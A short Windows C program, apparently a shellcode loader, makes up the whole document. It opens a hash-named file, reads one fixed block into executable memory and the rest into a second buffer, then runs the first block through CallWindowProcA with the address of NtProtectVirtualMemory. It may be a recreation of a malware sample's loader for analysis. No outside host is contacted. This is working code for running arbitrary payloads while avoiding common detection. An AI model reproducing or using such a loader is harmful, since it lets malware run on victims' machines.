#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "user32")

int main() {

    char *shellcode_file = "C:\\Users\\test\\Documents\\0e74333cb57056c1467ad26bfddccff7af53fbce18d808b76b48ea566cda6835~\\Sangbart142.Sia";
    LPVOID NtProtectVirtualMemory = (LPVOID)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
    DWORD file_size;

    HANDLE hFile = CreateFileA(
        shellcode_file,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    LPVOID FirstMem = VirtualAlloc(
        0,
        15517,
        0x3000,
        0x40
    );

    LPVOID SecondMem = VirtualAlloc(
        0,
        11874304,
        0x3000,
        4
    );

    file_size = GetFileSize(hFile, NULL);

    SetFilePointer(hFile, 3048, NULL, NULL);

    ReadFile(hFile, FirstMem, 15517, NULL, NULL);
    SetFilePointer(hFile, 3048+15517, NULL, NULL);
    ReadFile(hFile, SecondMem, file_size - 15517-3048, NULL, NULL);

    CallWindowProcA(FirstMem, SecondMem, NtProtectVirtualMemory, 0, 0);
    return 0;

}
